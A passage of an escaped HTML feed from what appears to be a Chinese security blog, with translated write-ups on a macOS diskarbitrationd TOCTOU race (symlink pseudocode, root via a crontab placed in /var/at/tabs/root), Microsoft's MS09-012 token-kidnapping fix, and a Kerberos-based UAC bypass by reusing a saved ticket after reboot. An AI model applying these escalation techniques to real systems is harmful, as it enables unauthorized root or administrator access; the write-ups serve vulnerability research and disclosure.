&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;DADiskGetDescription&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;disk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kDADiskDescriptionVolumePathKey&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;DARequestGetUserUID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;CFTypeRef&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mountpoint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;mountpoint&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;DARequestGetArgument2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// [...]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mountpoint&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;___CFURLCopyFileSystemRepresentation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mountpoint&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stat&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;st&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;stat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;st&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;st&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;st_uid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;DARequestGetUserUID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;n&#34;&gt;status&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kDAReturnNotPermitted&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这里实现的机制本应防止具有挂载权限的用户挂载到他们不拥有的目录(如/etc或/System)。如果挂载点存在但不归用户所有，则会产生kDAReturnNotPermitted错误代码。这里存在一个典型的检查时间与使用时间(TOCTOU)问题：如果在检查之后但在挂载之前创建挂载点，即使调用者不拥有挂载点，挂载也可能成功。&lt;/p&gt;
&lt;h2 id=&#34;构建本地管理员到root的利用&#34;&gt;构建本地管理员到root的利用
&lt;/h2&gt;&lt;p&gt;我们可以使用以下伪代码利用此漏洞将任何磁盘挂载到/etc：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;disk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/dev/some-disk-device&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;background&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;symlink&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/tmp/foo&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pointing&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;remove&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;symlink&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;disk&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mounted&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;at&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/etc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;send&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IPC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;diskarbitrationd&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mount&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;disk&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/tmp/foo/etc&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;最终，检查将在符号链接不存在时执行，但挂载将在符号链接存在时发生，因此两者都会通过。此时我们已经挂载到了/etc，这对于本地管理员用户来说通常是不可能的。&lt;/p&gt;
&lt;p&gt;我们使用MacBook上的EFI分区(/dev/disk0s1)作为可写设备，并通过在/var/at/tabs/root中创建crontab文件来获得root权限执行任意命令。&lt;/p&gt;
&lt;h2 id=&#34;从safari触发漏洞&#34;&gt;从Safari触发漏洞
&lt;/h2&gt;&lt;p&gt;要在沙箱中触发此漏洞，我们需要：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;访问diskarbitrationd的IPC端点 - 已满足&lt;/li&gt;
&lt;li&gt;对任意目录的写访问权限 - 已满足&lt;/li&gt;
&lt;li&gt;获取挂载的授权令牌 - 不满足&lt;/li&gt;
&lt;li&gt;创建符号链接的能力 - 不满足&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在系列的下一部分中，我们将介绍另外三个漏洞，其中一个用于创建符号链接，另外两个用于绕过授权逻辑中的沙箱检查。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>MS09-012补丁：修复&#34;令牌劫持&#34;漏洞的技术解析</title>
        <link>http://localhost:1313/p/ms09-012%E8%A1%A5%E4%B8%81%E4%BF%AE%E5%A4%8D%E4%BB%A4%E7%89%8C%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 16:13:46 +0800</pubDate>
        
        <guid>http://localhost:1313/p/ms09-012%E8%A1%A5%E4%B8%81%E4%BF%AE%E5%A4%8D%E4%BB%A4%E7%89%8C%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;ms09-012-修复令牌劫持漏洞&#34;&gt;MS09-012: 修复&amp;quot;令牌劫持&amp;quot;漏洞
&lt;/h1&gt;&lt;p&gt;今天早晨我们发布了MS09-012更新，用于修复公开披露的&amp;quot;令牌劫持&amp;quot;漏洞(&lt;a class=&#34;link&#34; href=&#34;http://www.argeniss.com/research/TokenKidnapping.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.argeniss.com/research/TokenKidnapping.pdf&lt;/a&gt;)。该漏洞允许从Network Service账户提权至Local System账户。通常情况下，恶意用户不会以Network Service身份运行，除非是像IIS这样的少数程序，可以在以Network Service运行的服务中执行任意代码。这使得攻击者能够攻破并控制Windows系统。&lt;/p&gt;
&lt;h2 id=&#34;我是否受影响&#34;&gt;我是否受影响？
&lt;/h2&gt;&lt;p&gt;此问题影响两种情况：在Network Service账户拥有的进程中执行不受信任的代码，或在具有SeImpersonatePrivilege的进程中执行代码。公开讨论的攻击方式是通过托管在IIS工作进程中的恶意Full Trust ASPX代码实现的。&lt;/p&gt;
&lt;h2 id=&#34;技术背景&#34;&gt;技术背景
&lt;/h2&gt;&lt;p&gt;修复此问题需要微软有史以来最庞大的工程努力之一。本次安全更新涉及：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows内核修改&lt;/li&gt;
&lt;li&gt;COM、DCOM和LSASS子系统&lt;/li&gt;
&lt;li&gt;WMI和MSDTC内置服务&lt;/li&gt;
&lt;li&gt;服务控制管理器(SCM)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们不得不将Vista和Server 2008中的服务令牌工作大量反向移植到XP和Server 2003。部分最资深的开发人员从Windows 7开发中抽调出来处理此问题。&lt;/p&gt;
&lt;h2 id=&#34;修复的四个cve漏洞&#34;&gt;修复的四个CVE漏洞
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CVE-2008-1436 (MSDTC)&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;问题：MSDTC在创建RPC连接时请求过多权限&lt;/li&gt;
&lt;li&gt;修复：减少RPC连接时的权限请求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CVE-2009-0079 (RPCSS)&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;问题：Network Service账户下运行服务的权限问题&lt;/li&gt;
&lt;li&gt;修复：移植Vista的Service SID功能&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CVE-2009-0080 (线程池)&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;问题：线程创建时的权限验证不足&lt;/li&gt;
&lt;li&gt;修复：强化线程访问权限&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CVE-2009-0078 (WMI)&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;问题：WMI运行Network Service和Local Service提供程序时缺乏保护&lt;/li&gt;
&lt;li&gt;修复：采用基于Vista Service SID技术的WMI SID保护机制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;未来方向&#34;&gt;未来方向
&lt;/h2&gt;&lt;p&gt;Windows 7和Server 2008 R2将引入&amp;quot;托管服务账户&amp;quot;功能，提供更灵活的解决方案：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;允许服务运行为独立账户&lt;/li&gt;
&lt;li&gt;提供自动密码管理功能&lt;/li&gt;
&lt;li&gt;简化域SPN远程认证流程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;本文内容&amp;quot;按原样&amp;quot;提供，不提供任何担保，也不授予任何权利。&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Nick Finco, MSRC工程团队&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>以最复杂方式绕过UAC：Kerberos协议漏洞利用详解</title>
        <link>http://localhost:1313/p/%E4%BB%A5%E6%9C%80%E5%A4%8D%E6%9D%82%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87uackerberos%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AF%A6%E8%A7%A3/</link>
        <pubDate>Fri, 01 Aug 2025 23:30:05 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BB%A5%E6%9C%80%E5%A4%8D%E6%9D%82%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87uackerberos%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AF%A6%E8%A7%A3/</guid>
        <description>&lt;h1 id=&#34;以最复杂方式绕过uac&#34;&gt;以最复杂方式绕过UAC
&lt;/h1&gt;&lt;p&gt;虽然我不常研究这个，但发现新的UAC绕过方法总是很有趣。在阅读Rubeus工具的功能时，我意识到可以滥用Kerberos协议绕过UAC——至少在域加入系统中可行。不清楚之前是否有人记录过这种方法，有篇帖子讨论过类似技术但需要从其他系统发起攻击，而本文将描述本地实现的方案。&lt;/p&gt;
&lt;h2 id=&#34;技术背景&#34;&gt;技术背景
&lt;/h2&gt;&lt;p&gt;系统默认会通过LSASS过滤网络身份验证令牌，移除本地管理员的权限。但存在关键例外：如果用户是域用户兼本地管理员，LSASS会允许网络认证使用完整管理员令牌。这在通过Kerberos进行本地认证时会产生问题——难道这不是简单的UAC绕过吗？&lt;/p&gt;
&lt;p&gt;实际上Kerberos有专门机制阻止这种攻击。去年我阅读了微软工程师Steve Syfuhs关于Kerberos如何防止本地UAC绕过的文章。简而言之：当用户请求服务票据时，LSASS会在TGS-REQ请求中嵌入本地安全信息，这些信息会被编码到生成的票据中。当该票据用于本地系统认证时，Kerberos会提取这些信息进行验证。&lt;/p&gt;
&lt;p&gt;通过分析Kerberos票据，我们发现两个关键字段：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Authorization&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Data&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;KERB_AD_RESTRICTION_ENTRY&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Flags&lt;/span&gt;           &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LimitedToken&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Integrity&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Level&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Medium&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Machine&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;      &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;6640665F&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Authorization&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Data&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;KERB_LOCAL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Security&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;60CE03337E01000025FC763900000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;核心绕过机制&#34;&gt;核心绕过机制
&lt;/h2&gt;&lt;p&gt;LSASS通过&lt;code&gt;LsaISetSupplementalTokenInfo&lt;/code&gt;函数处理这些字段，主要检查包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;比较票据中的MachineID与LSASS内存中的值&lt;/li&gt;
&lt;li&gt;检查未公开的LSA网络令牌过滤标志&lt;/li&gt;
&lt;li&gt;验证用户SID是否属于本地账户域&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;当满足以下任一条件时过滤将失效：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户SID不属于本地账户域&lt;/li&gt;
&lt;li&gt;LocalAccountTokenFilterPolicy策略非零&lt;/li&gt;
&lt;li&gt;系统是域控制器(NtProductLanManNt)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;两种具体利用方法&#34;&gt;两种具体利用方法
&lt;/h2&gt;&lt;h3 id=&#34;方法一票据重用攻击&#34;&gt;方法一：票据重用攻击
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;获取本地系统的服务票据并保存&lt;/li&gt;
&lt;li&gt;重启系统使LSASS重新初始化&lt;/li&gt;
&lt;li&gt;重新加载旧票据，此时MachineID不匹配导致过滤失效&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
